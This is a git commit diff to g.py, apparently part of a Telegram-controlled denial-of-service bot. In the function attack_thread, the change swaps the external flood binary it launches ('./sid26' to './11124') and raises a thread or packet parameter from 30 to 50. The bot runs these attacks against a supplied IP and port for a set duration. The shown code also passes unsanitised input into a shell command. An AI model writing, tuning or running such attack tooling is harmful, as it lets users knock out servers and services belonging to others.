b2407e594168b9b4dc3454585159b89cd0a25f48
Free Users <freedemonbots@outlook.com>
2024-10-28 17:43:12 +0530

    g.py

--- g.py
+++ g.py
@@ -136,7 +136,7 @@ def send_telegram_message(chat_id, text):
 def attack_thread(ip, port, attack_time, attack_id):
     try:
         start_time = time.time()
-        command = f"./sid26 {ip} {port} {attack_time} 30"
+        command = f"./11124 {ip} {port} {attack_time} 50"
         process = subprocess.Popen(command, shell=True)
         time.sleep(attack_time)  # Wait for attack time
 
